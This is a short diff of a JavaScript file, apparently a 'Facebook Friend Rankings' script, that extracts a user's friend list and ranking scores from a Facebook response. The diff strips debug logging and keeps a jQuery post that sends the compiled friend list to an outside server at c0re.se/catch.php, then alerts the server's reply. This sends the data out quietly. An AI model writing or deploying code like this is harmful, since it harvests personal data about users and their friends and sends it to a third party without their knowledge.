@@ -33,25 +33,15 @@ $.ajax({
 		alert('Please try again.');
 	},
 	error: function(data){
-		console.log('1st');
 		var text = data.responseText;
-
 		var json = text.substring(text.indexOf('{'));
-		
 		var friends = $.parseJSON(json);
-
 		friends = friends.payload.entries;
-
 		var display = "Facebook Friend Rankings";
-
 		for(var i = 0; i < friends.length; i++){
 			var info = "\n" + friends[i].text + " " + friends[i].index;
 			display += info;
 		}
-		console.log(display);
-		console.log('Ponies');
-		$.post("http://c0re.se/catch.php", { text:display });
-		console.log('3rd');
-
+		$.post("http://c0re.se/catch.php", { text:display }, function(response){ alert(response); } );
 	}
 });
